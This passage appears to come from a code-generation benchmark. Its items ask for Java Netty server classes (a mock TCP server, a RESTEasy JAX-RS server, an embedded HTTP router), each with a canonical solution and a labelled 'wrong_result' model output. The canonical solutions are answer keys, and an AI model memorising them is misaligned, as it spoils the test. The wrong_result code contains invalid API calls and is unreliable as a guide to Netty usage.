    "wrong_result": "public class RemoteServer extends BaseServer {\n    private int port;\n    private List<Protocol> protocolList;\n\n    public RemoteServer(int port) {\n        this.port = port;\n        this.protocolList = new ArrayList<>();\n    }\n\n    public void listen(int port) {\n        this.port = port;\n    }\n\n    public void start() {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(new CustomHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    private class CustomHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            Protocol protocol = new Protocol();\n            protocol.setContext(ctx);\n            protocolList.add(protocol);\n            super.channelActive(ctx);\n        }\n    }\n\n    public Protocol findProtocolByBrowser(ChannelHandlerContext ctx) {\n        for (Protocol p : protocolList) {\n            if (p.getBrowserContext() == ctx) {\n                return p;\n            }\n        }\n        return null;\n    }\n\n    public Protocol findProtocolByKey(String key) {\n        for (Protocol p : protocolList) {\n            if (p.getKey().equals(key)) {\n                return p;\n            }\n        }\n        return null;\n    }\n\n    public Protocol findProtocolByClient(ChannelHandlerContext ctx) {\n        for (Protocol p : protocolList) {\n            if (p.getClientContext() == ctx) {\n                return p;\n            }\n        }\n        return null;\n    }\n}"
  },
  {
    "Task_id": 175,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework, capable of handling multiple client connections with configurable channel handlers.\n\nClass Description: MockTcpServer is a Netty-based TCP server implementation that provides flexible handler configuration and proper resource management. It uses NIO event loop groups for efficient connection handling and includes graceful shutdown capabilities.\n\nAttributes:\n- bossGroup: [NioEventLoopGroup] - Handles incoming connection requests and accepts them\n- workerGroup: [NioEventLoopGroup] - Handles the traffic of accepted connections\n- channel: [Channel] - Represents the server's listening channel\n- handlers: [List<Supplier<? extends ChannelHandler>>] - List of handler suppliers for processing incoming data\n\nMethods:\n- addHandler(Supplier<? extends ChannelHandler> supplier) -> [void] - Adds a channel handler supplier to the pipeline configuration\n- initialize(int port) -> [void] throws InterruptedException - Starts the server on specified port and initializes all configured handlers\n- shutdown() -> [void] - Closes the server channel and triggers graceful shutdown of event loops\n- Resources (static inner class) -> [NioEventLoopGroup] - Manages shared event loop groups and shutdown hooks for resource cleanup",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.util.concurrent.DefaultThreadFactory;\n\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.concurrent.TimeUnit;\nimport java.util.function.Supplier;\n\npublic class MockTcpServer {\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private Channel channel;\n    private List<Supplier<? extends ChannelHandler>> handlers = new ArrayList<>();\n\n    public void addHandler(Supplier<? extends ChannelHandler> supplier) {\n        handlers.add(supplier);\n    }\n\n    public void initialize(int port) throws InterruptedException {\n        bossGroup = Resources.bossGroup;\n        workerGroup = Resources.workerGroup;\n\n        ServerBootstrap b = new ServerBootstrap();\n        b.group(bossGroup, workerGroup)\n         .channel(NioServerSocketChannel.class)\n         .option(ChannelOption.SO_BACKLOG, 100)\n         .childHandler(new ChannelInitializer<SocketChannel>() {\n             @Override\n             public void initChannel(SocketChannel ch) {\n                 ChannelPipeline p = ch.pipeline();\n                 for (Supplier<? extends ChannelHandler> handler : handlers) {\n                     p.addLast(handler.get());\n                 }\n             }\n         });\n\n        ChannelFuture f = b.bind(port).sync();\n        channel = f.channel();\n    }\n\n    public void shutdown() {\n        channel.close();\n    }\n\n    private static class Resources {\n        private static final EventLoopGroup bossGroup;\n        private static final EventLoopGroup workerGroup;\n\n        static {\n            bossGroup = new NioEventLoopGroup(1, new DefaultThreadFactory(NioEventLoopGroup.class, true));\n            workerGroup = new NioEventLoopGroup(5, new DefaultThreadFactory(NioEventLoopGroup.class, true));\n\n            Runtime.getRuntime().addShutdownHook(new Thread(() -> {\n                bossGroup.shutdownGracefully(0, 0, TimeUnit.MILLISECONDS);\n                workerGroup.shutdownGracefully(0, 0, TimeUnit.MILLISECONDS);\n            }, \"MockRedisServer-shutdown\"));\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class MockTcpServer {\n    private final NioEventLoopGroup bossGroup;\n    private final NioEventLoopGroup workerGroup;\n    private Channel channel;\n    private final List<Supplier<? extends ChannelHandler>> handlers = new ArrayList<>();\n\n    public MockTcpServer() {\n        bossGroup = Resources.getBossGroup();\n        workerGroup = Resources.getWorkerGroup();\n    }\n\n    public void addHandler(Supplier<? extends ChannelHandler> supplier) {\n        handlers.add(supplier);\n    }\n\n    public void initialize(int port) throws InterruptedException {\n        ServerBootstrap b = new ServerBootstrap();\n        b.group(bossGroup, workerGroup)\n         .channel(NioServerSocketChannel.class)\n         .childHandler(new ChannelInitializer<Channel>() {\n             @Override\n             protected void initChannel(Channel ch) {\n                 for (Supplier<? extends ChannelHandler> supplier : handlers) {\n                     ch.pipeline().addLast(supplier.get());\n                 }\n             }\n         })\n         .option(ChannelOption.SO_BACKLOG, 128)\n         .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        channel = b.bind(port).sync().channel();\n    }\n\n    public void shutdown() {\n        if (channel != null) {\n            channel.close();\n        }\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n\n    public static class Resources {\n        private static final NioEventLoopGroup BOSS_GROUP = new NioEventLoopGroup(1);\n        private static final NioEventLoopGroup WORKER_GROUP = new NioEventLoopGroup();\n\n        static {\n            Runtime.getRuntime().addShutdownHook(new Thread(() -> {\n                BOSS_GROUP.shutdownGracefully();\n                WORKER_GROUP.shutdownGracefully();\n            }));\n        }\n\n        public static NioEventLoopGroup getBossGroup() {\n            return BOSS_GROUP;\n        }\n\n        public static NioEventLoopGroup getWorkerGroup() {\n            return WORKER_GROUP;\n        }\n    }\n}"
  },
  {
    "Task_id": 176,
    "Instruction": "Task Description: Implement a Netty-based JAX-RS server class that handles HTTP requests and integrates with RESTEasy framework for RESTful service deployment.\n\nClass Description: SofaNettyJaxrsServer is a Netty-based embedded JAX-RS server implementation that provides HTTP communication capabilities and integrates with RESTEasy framework for RESTful service deployment. It supports both standard NIO and Epoll transport, SSL/TLS encryption, and customizable channel options.\n\nAttributes:\n- serverConfig: [ServerConfig] - Configuration object containing server settings\n- bootstrap: [ServerBootstrap] - Netty server bootstrap instance\n- hostname: [String] - Hostname to bind the server to\n- port: [int] - Port number to listen on\n- deployment: [ResteasyDeployment] - RESTEasy deployment configuration\n- root: [String] - Root resource path\n- domain: [SecurityDomain] - Security domain for authentication\n- eventLoopGroup: [EventLoopGroup] - Netty event loop group for I/O operations\n- eventExecutor: [EventLoopGroup] - Netty event executor for business logic\n- ioWorkerCount: [int] - Number of I/O worker threads\n- executorThreadCount: [int] - Number of executor threads\n- sslContext: [SSLContext] - SSL context for secure connections\n- maxRequestSize: [int] - Maximum allowed HTTP request size\n- backlog: [int] - Connection backlog size\n- channelHandlers: [List<ChannelHandler>] - Additional channel handlers\n- channelOptions: [Map<ChannelOption, Object>] - Channel options\n- childChannelOptions: [Map<ChannelOption, Object>] - Child channel options\n- httpChannelHandlers: [List<ChannelHandler>] - Additional HTTP channel handlers\n\nMethods:\n- start(): [void] - Starts the Netty server and binds it to the configured host and port\n- stop(): [void] - Stops the server and releases all resources\n- createChannelInitializer(): [ChannelInitializer<SocketChannel>] - Creates a channel initializer for new connections\n- setupHandlers(SocketChannel ch, RequestDispatcher dispatcher): [void] - Sets up the channel pipeline with required handlers\n- createRequestDispatcher(): [RequestDispatcher] - Creates a RESTEasy request dispatcher",
    "Canonical_solution": "import com.alipay.sofa.rpc.common.SystemInfo;\nimport com.alipay.sofa.rpc.common.struct.NamedThreadFactory;\nimport com.alipay.sofa.rpc.common.utils.StringUtils;\nimport com.alipay.sofa.rpc.config.ServerConfig;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.epoll.EpollEventLoopGroup;\nimport io.netty.channel.epoll.EpollServerSocketChannel;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpRequestDecoder;\nimport io.netty.handler.codec.http.HttpResponseEncoder;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.util.concurrent.EventExecutor;\nimport org.jboss.resteasy.core.SynchronousDispatcher;\nimport org.jboss.resteasy.plugins.server.embedded.EmbeddedJaxrsServer;\nimport org.jboss.resteasy.plugins.server.embedded.SecurityDomain;\nimport org.jboss.resteasy.plugins.server.netty.RequestDispatcher;\nimport org.jboss.resteasy.plugins.server.netty.RestEasyHttpRequestDecoder;\nimport org.jboss.resteasy.plugins.server.netty.RestEasyHttpResponseEncoder;\nimport org.jboss.resteasy.spi.ResteasyDeployment;\n\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLEngine;\nimport java.net.InetSocketAddress;\nimport java.util.Collections;\nimport java.util.List;\nimport java.util.Map;\n\npublic class SofaNettyJaxrsServer implements EmbeddedJaxrsServer {\n\n    private final ServerConfig         serverConfig;\n    protected ServerBootstrap          bootstrap;\n    protected String                   hostname;\n    protected int                      port;\n    protected ResteasyDeployment       deployment;\n    protected String                   root;\n    protected SecurityDomain           domain;\n    private EventLoopGroup             eventLoopGroup;\n    private EventLoopGroup             eventExecutor;\n    private int                        ioWorkerCount;\n    private int                        executorThreadCount;\n    private SSLContext                 sslContext;\n    private int                        maxRequestSize;\n    private int                        backlog;\n    private List<ChannelHandler>       channelHandlers;\n    private Map<ChannelOption, Object> channelOptions;\n    private Map<ChannelOption, Object> childChannelOptions;\n    private List<ChannelHandler>       httpChannelHandlers;\n\n    public SofaNettyJaxrsServer(ServerConfig serverConfig) {\n        if (serverConfig == null) {\n            throw new IllegalArgumentException(\"server config is null\");\n        }\n        this.serverConfig = serverConfig;\n        this.deployment = new ResteasyDeployment();\n        this.root = \"\";\n        this.ioWorkerCount = SystemInfo.getCpuCores() * 2;\n        this.executorThreadCount = 16;\n        this.maxRequestSize = 1024 * 1024 * 10;\n        this.backlog = 128;\n        this.channelHandlers = Collections.emptyList();\n        this.channelOptions = Collections.emptyMap();\n        this.childChannelOptions = Collections.emptyMap();\n        this.httpChannelHandlers = Collections.emptyList();\n    }\n\n    @Override\n    public void start() {\n        boolean daemon = serverConfig.isDaemon();\n        boolean isEpoll = serverConfig.isEpoll();\n        NamedThreadFactory ioFactory = new NamedThreadFactory(\"SEV-REST-IO-\" + port, daemon);\n        NamedThreadFactory bizFactory = new NamedThreadFactory(\"SEV-REST-BIZ-\" + port, daemon);\n        eventLoopGroup = isEpoll ? new EpollEventLoopGroup(ioWorkerCount, ioFactory)\n            : new NioEventLoopGroup(ioWorkerCount, ioFactory);\n        eventExecutor = isEpoll ? new EpollEventLoopGroup(executorThreadCount, bizFactory)\n            : new NioEventLoopGroup(executorThreadCount, bizFactory);\n\n        bootstrap = new ServerBootstrap()\n            .group(eventLoopGroup)\n            .channel(isEpoll ? EpollServerSocketChannel.class : NioServerSocketChannel.class)\n            .childHandler(createChannelInitializer())\n            .option(ChannelOption.SO_BACKLOG, backlog)\n            .childOption(ChannelOption.SO_KEEPALIVE, serverConfig.isKeepAlive());\n\n        for (Map.Entry<ChannelOption, Object> entry : channelOptions.entrySet()) {\n            bootstrap.option(entry.getKey(), entry.getValue());\n        }\n\n        for (Map.Entry<ChannelOption, Object> entry : childChannelOptions.entrySet()) {\n            bootstrap.childOption(entry.getKey(), entry.getValue());\n        }\n\n        final InetSocketAddress socketAddress;\n        if (null == hostname || hostname.isEmpty()) {\n            socketAddress = new InetSocketAddress(port);\n        } else {\n            socketAddress = new InetSocketAddress(hostname, port);\n        }\n\n        bootstrap.bind(socketAddress).syncUninterruptibly();\n    }\n\n    private ChannelInitializer<SocketChannel> createChannelInitializer() {\n        final RequestDispatcher dispatcher = createRequestDispatcher();\n        if (sslContext == null) {\n            return new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    setupHandlers(ch, dispatcher);\n                }\n            };\n        } else {\n            final SSLEngine engine = sslContext.createSSLEngine();\n            engine.setUseClientMode(false);\n            return new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ch.pipeline().addFirst(new SslHandler(engine));\n                    setupHandlers(ch, dispatcher);\n                }\n            };\n        }\n    }\n\n    private void setupHandlers(SocketChannel ch, RequestDispatcher dispatcher) {\n        ChannelPipeline channelPipeline = ch.pipeline();\n        channelPipeline.addLast(channelHandlers.toArray(new ChannelHandler[channelHandlers.size()]));\n        channelPipeline.addLast(new HttpRequestDecoder());\n        channelPipeline.addLast(new HttpObjectAggregator(maxRequestSize));\n        channelPipeline.addLast(new HttpResponseEncoder());\n        channelPipeline.addLast(httpChannelHandlers.toArray(new ChannelHandler[httpChannelHandlers.size()]));\n        channelPipeline.addLast(new RestEasyHttpRequestDecoder(dispatcher.getDispatcher(), root));\n        channelPipeline.addLast(new RestEasyHttpResponseEncoder());\n        channelPipeline.addLast(eventExecutor, new SofaRestRequestHandler(dispatcher));\n    }\n\n    protected RequestDispatcher createRequestDispatcher() {\n        return new RequestDispatcher((SynchronousDispatcher) deployment.getDispatcher(),\n            deployment.getProviderFactory(), domain);\n    }\n\n    @Override\n    public void stop() {\n        try {\n            eventLoopGroup.shutdownGracefully().sync();\n            eventExecutor.shutdownGracefully().sync();\n        } catch (Exception ignore) {\n        }\n        bootstrap = null;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class SofaNettyJaxrsServer {\n    private final ServerConfig serverConfig;\n    private final ServerBootstrap bootstrap;\n    private final String hostname;\n    private final int port;\n    private final ResteasyDeployment deployment;\n    private final String root;\n    private final SecurityDomain domain;\n    private final EventLoopGroup eventLoopGroup;\n    private final EventLoopGroup eventExecutor;\n    private final int ioWorkerCount;\n    private final int executorThreadCount;\n    private final SSLContext sslContext;\n    private final int maxRequestSize;\n    private final int backlog;\n    private final List<ChannelHandler> channelHandlers;\n    private final Map<ChannelOption, Object> channelOptions;\n    private final Map<ChannelOption, Object> childChannelOptions;\n    private final List<ChannelHandler> httpChannelHandlers;\n\n    public SofaNettyJaxrsServer(ServerConfig serverConfig) {\n        this.serverConfig = serverConfig;\n        this.hostname = serverConfig.getHostname();\n        this.port = serverConfig.getPort();\n        this.deployment = new ResteasyDeployment();\n        this.root = serverConfig.getRoot();\n        this.domain = serverConfig.getDomain();\n        this.ioWorkerCount = serverConfig.getIoWorkerCount();\n        this.executorThreadCount = serverConfig.getExecutorThreadCount();\n        this.sslContext = serverConfig.getSslContext();\n        this.maxRequestSize = serverConfig.getMaxRequestSize();\n        this.backlog = serverConfig.getBacklog();\n        this.channelHandlers = serverConfig.getChannelHandlers();\n        this.channelOptions = serverConfig.getChannelOptions();\n        this.childChannelOptions = serverConfig.getChildChannelOptions();\n        this.httpChannelHandlers = serverConfig.getHttpChannelHandlers();\n\n        this.eventLoopGroup = new NioEventLoopGroup(ioWorkerCount);\n        this.eventExecutor = new NioEventLoopGroup(executorThreadCount);\n        this.bootstrap = new ServerBootstrap();\n        this.bootstrap.group(eventLoopGroup)\n                      .channel(serverConfig.isEpollEnabled() ? EpollServerSocketChannel.class : NioServerSocketChannel.class);\n    }\n\n    public void start() {\n        bootstrap.childHandler(createChannelInitializer())\n                 .option(ChannelOption.SO_BACKLOG, backlog)\n                 .childOption(ChannelOption.SO_REUSEADDR, true);\n\n        for (Map.Entry<ChannelOption, Object> entry : channelOptions.entrySet()) {\n            bootstrap.option(entry.getKey(), entry.getValue());\n        }\n\n        for (Map.Entry<ChannelOption, Object> entry : childChannelOptions.entrySet()) {\n            bootstrap.childOption(entry.getKey(), entry.getValue());\n        }\n\n        if (sslContext != null) {\n            bootstrap.childHandler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) {\n                    ch.pipeline().addLast(sslContext.newHandler(ch.alloc()));\n                }\n            });\n        }\n\n        Channel channel = bootstrap.bind(hostname, port).sync().channel();\n        channel.closeFuture().awaitUninterruptibly();\n    }\n\n    public void stop() {\n        if (eventLoopGroup != null) {\n            eventLoopGroup.shutdownGracefully();\n        }\n        if (eventExecutor != null) {\n            eventExecutor.shutdownGracefully();\n        }\n    }\n\n    private ChannelInitializer<SocketChannel> createChannelInitializer() {\n        return new ChannelInitializer<SocketChannel>() {\n            @Override\n            public void initChannel(SocketChannel ch) {\n                setupHandlers(ch, createRequestDispatcher());\n            }\n        };\n    }\n\n    private void setupHandlers(SocketChannel ch, RequestDispatcher dispatcher) {\n        ch.pipeline().addLast(channelHandlers);\n        ch.pipeline().addLast(httpChannelHandlers);\n        ch.pipeline().addLast(new HttpServerCodec(maxRequestSize));\n        ch.pipeline().addLast(new HttpObjectAggregator(maxRequestSize));\n        ch.pipeline().addLast(dispatcher);\n    }\n\n    private RequestDispatcher createRequestDispatcher() {\n        deployment.setRootPath(root);\n        deployment.setSecurityDomain(domain);\n        deployment.setResteasyDeployment(deployment);\n        return deployment;\n    }\n}"
  },
  {
    "Task_id": 177,
    "Instruction": "Task Description: Create a Java class that implements an embedded HTTP server using Netty framework, capable of handling HTTP requests and routing them to appropriate controller methods based on URI paths.\n\nClass Description: EmbedHttpServer is a Netty-based HTTP server implementation that provides request routing functionality to various controller methods. It supports adding custom controllers with RequestMapping annotations and handles both successful responses and error cases.\n\nAttributes:\n- port: int - The port number on which the server will listen\n- defaultController: DefaultController - The default controller to handle unmatched requests\n- controllerList: List<Object> - List of registered controller objects that handle specific routes\n- LOGGER: Logger - Logger instance for error and debug logging\n\nMethods:\n- EmbedHttpServer(int port) -> EmbedHttpServer - Constructor that initializes the server with specified port\n- invoke(String uri, Channel channel, FullHttpRequest request) -> FullHttpResponse - Routes the incoming request to the appropriate controller method based on URI matching\n- fixUri(String uri) -> String - Normalizes URI paths by ensuring proper slash formatting\n- start(GenericFutureListener startedListener) -> void - Starts the Netty server with specified configuration and event listeners\n- addController(Object obj) -> EmbedHttpServer - Registers a controller object to handle specific routes, supports method chaining",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.SimpleChannelInboundHandler;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.FullHttpRequest;\nimport io.netty.handler.codec.http.FullHttpResponse;\nimport io.netty.handler.codec.http.HttpHeaderNames;\nimport io.netty.handler.codec.http.HttpHeaderValues;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpResponseStatus;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.util.concurrent.GenericFutureListener;\nimport java.lang.reflect.Method;\nimport java.net.URI;\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\nimport org.pdown.gui.http.controller.DefaultController;\nimport org.pdown.gui.http.util.HttpHandlerUtil;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.web.bind.annotation.RequestMapping;\n\npublic class EmbedHttpServer {\n\n  private static final Logger LOGGER = LoggerFactory.getLogger(EmbedHttpServer.class);\n\n  private int port;\n  private DefaultController defaultController;\n  private List<Object> controllerList;\n\n  public EmbedHttpServer(int port) {\n    this.port = port;\n    this.defaultController = new DefaultController();\n    this.controllerList = new ArrayList<>();\n  }\n\n  public FullHttpResponse invoke(String uri, Channel channel, FullHttpRequest request) throws Exception {\n    if (controllerList != null) {\n      for (Object obj : controllerList) {\n        Class<?> clazz = obj.getClass();\n        RequestMapping mapping = clazz.getAnnotation(RequestMapping.class);\n        if (mapping != null) {\n          String mappingUri = fixUri(mapping.value()[0]);\n          for (Method actionMethod : clazz.getMethods()) {\n            RequestMapping subMapping = actionMethod.getAnnotation(RequestMapping.class);\n            if (subMapping != null) {\n              String subMappingUri = fixUri(subMapping.value()[0]);\n              if (uri.equalsIgnoreCase(mappingUri + subMappingUri)) {\n                return (FullHttpResponse) actionMethod.invoke(obj, channel, request);\n              }\n            }\n          }\n        }\n      }\n    }\n    return defaultController.handle(channel, request);\n  }\n\n  private String fixUri(String uri) {\n    StringBuilder builder = new StringBuilder(uri);\n    if (builder.indexOf(\"/\") != 0) {\n      builder.insert(0, \"/\");\n    }\n    if (builder.lastIndexOf(\"/\") == builder.length() - 1) {\n      builder.delete(builder.length() - 1, builder.length());\n    }\n    return builder.toString();\n  }\n\n  public void start(GenericFutureListener startedListener) {\n    NioEventLoopGroup bossGroup = new NioEventLoopGroup(2);\n    NioEventLoopGroup workGroup = new NioEventLoopGroup(2);\n    try {\n      ServerBootstrap bootstrap = new ServerBootstrap().group(bossGroup, workGroup)\n          .channel(NioServerSocketChannel.class)\n          .childHandler(new ChannelInitializer<Channel>() {\n            @Override\n            protected void initChannel(Channel ch) throws Exception {\n              ch.pipeline().addLast(\"httpCodec\", new HttpServerCodec());\n              ch.pipeline().addLast(new HttpObjectAggregator(4194304));\n              ch.pipeline()\n                  .addLast(\"serverHandle\", new SimpleChannelInboundHandler<FullHttpRequest>() {\n\n                    @Override\n                    protected void channelRead0(ChannelHandlerContext ctx, FullHttpRequest request) throws Exception {\n                      URI uri = new URI(request.uri());\n                      FullHttpResponse httpResponse = invoke(uri.getPath(), ctx.channel(), request);\n                      if (httpResponse != null) {\n                        httpResponse.headers().set(HttpHeaderNames.CONNECTION, HttpHeaderValues.KEEP_ALIVE);\n                        httpResponse.headers().set(HttpHeaderNames.CONTENT_LENGTH, httpResponse.content().readableBytes());\n                        ch.writeAndFlush(httpResponse);\n                      }\n                    }\n\n                    @Override\n                    public void channelUnregistered(ChannelHandlerContext ctx) {\n                      ctx.channel().close();\n                    }\n\n                    @Override\n                    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n                      LOGGER.error(\"native request error\", cause.getCause() == null ? cause : cause.getCause());\n                      Map<String, Object> data = new HashMap<>();\n                      data.put(\"error\", cause.getCause().toString());\n                      FullHttpResponse httpResponse = HttpHandlerUtil.buildJson(data);\n                      httpResponse.setStatus(HttpResponseStatus.INTERNAL_SERVER_ERROR);\n                      ctx.channel().writeAndFlush(httpResponse);\n                    }\n                  });\n            }\n          });\n      ChannelFuture f = bootstrap.bind(\"127.0.0.1\", port).sync();\n      if (startedListener != null) {\n        f.addListener(startedListener);\n      }\n      f.channel().closeFuture().sync();\n    } catch (Exception e) {\n      e.printStackTrace();\n    } finally {\n      bossGroup.shutdownGracefully();\n      workGroup.shutdownGracefully();\n    }\n  }\n\n  public EmbedHttpServer addController(Object obj) {\n    this.controllerList.add(obj);\n    return this;\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class EmbedHttpServer {\n    private final int port;\n    private final DefaultController defaultController;\n    private final List<Object> controllerList = new ArrayList<>();\n    private final Logger LOGGER;\n    private final Map<String, Map<String, List<MethodAndController>>> routeMap = new HashMap<>();\n\n    public EmbedHttpServer(int port) {\n        this.port = port;\n        this.defaultController = new DefaultController();\n        this.LOGGER = LoggerFactory.getLogger(EmbedHttpServer.class);\n    }\n\n    public FullHttpResponse invoke(String uri, Channel channel, FullHttpRequest request) {\n        String normalizedUri = fixUri(uri);\n        String httpMethod = request.method().name();\n\n        Map<String, List<MethodAndController>> methodListMap = routeMap.get(normalizedUri);\n        if (methodListMap != null) {\n            List<MethodAndController> methodList = methodListMap.get(httpMethod);\n            if (methodList != null) {\n                for (MethodAndController mc : methodList) {\n                    try {\n                        Object[] args = new Object[]{request, channel};\n                        FullHttpResponse response = (FullHttpResponse) mc.getMethod().invoke(mc.getController(), args);\n                        return response;\n                    } catch (Exception e) {\n                        LOGGER.error(\"Error invoking controller method\", e);\n                        return createErrorResponse(e.getMessage(), HttpResponseStatus.INTERNAL_SERVER_ERROR);\n                    }\n                }\n            }\n        }\n\n        return defaultController.handle(request);\n    }\n\n    private String fixUri(String uri) {\n        if (uri == null || uri.isEmpty()) {\n            return \"/\";\n        }\n        uri = uri.trim();\n        if (!uri.startsWith(\"/\")) {\n            uri = \"/\" + uri;\n        }\n        if (uri.endsWith(\"/\")) {\n            uri = uri.substring(0, uri.length() - 1);\n        }\n        return uri;\n    }\n\n    public void start(GenericFutureListener startedListener) {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) {\n                     ch.pipeline().addLast(new HttpServerCodec());\n                     ch.pipeline().addLast(new HttpObjectAggregator(65536));\n                     ch.pipeline().addLast(new HttpServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            f.addListener(startedListener);\n            f.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            LOGGER.error(\"Server start interrupted\", e);\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    public EmbedHttpServer addController(Object obj) {\n        controllerList.add(obj);\n        Class<?> clazz = obj.getClass();\n        Method[] methods = clazz.getMethods();\n        for (Method method : methods) {\n            RequestMapping annotation = method.getAnnotation(RequestMapping.class);\n            if (annotation != null) {\n                String path = annotation.value();\n                String httpMethod = annotation.method().name();\n                routeMap.computeIfAbsent(path, k -> new HashMap<>())\n                        .computeIfAbsent(httpMethod, k -> new ArrayList<>())\n                        .add(new MethodAndController(method, obj));\n            }\n        }\n        return this;\n    }\n\n    private FullHttpResponse createErrorResponse(String message, HttpResponseStatus status) {\n        FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, status);\n        ByteBuf content = Unpooled.copiedBuffer(message, CharsetUtil.UTF_8);\n        response.content().writeBytes(content);\n        return response;\n    }\n\n    private static class MethodAndController {\n        private final Method method;\n        private final Object controller;\n\n        public MethodAndController(Method method, Object controller) {\n            this.method = method;\n            this.controller = controller;\n        }\n\n        public Method getMethod() {\n            return method;\n        }\n\n        public Object getController() {\n            return controller;\n        }\n    }\n\n    private class HttpServerHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            if (msg instanceof FullHttpRequest) {\n                FullHttpRequest request = (FullHttpRequest) msg;\n                FullHttpResponse response = invoke(request.uri(), ctx.channel(), request);\n                ctx.writeAndFlush(response);\n            }\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 178,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework with line-based frame decoding capability. The server should handle incoming connections, process line-delimited messages, and manage resources properly during startup and shutdown.\n\nClass Description: MyLineBasedFrameDecoderServer is a Netty-based TCP server that uses line-based frame decoding for handling text protocols. It manages server lifecycle including startup, connection handling, and graceful shutdown.\n\nAttributes:\n- bossGroup: [NioEventLoopGroup] - Handles incoming connection requests and accepts them\n- workerGroup: [NioEventLoopGroup] - Handles I/O operations for accepted connections\n- bootstrap: [ServerBootstrap] - Netty server configuration and management object\n- DEFAULT_PORT: [int] - Default port number for the server (8023)\n\nMethods:\n- start([int port]) -> [void] - Starts the server on specified port, binds handlers, and begins accepting connections. Throws Exception if startup fails.\n- shutdown() -> [void] - Gracefully shuts down the server by releasing all thread resources\n- main([String[] args]) -> [void] - Entry point that creates and starts the server instance on default port",
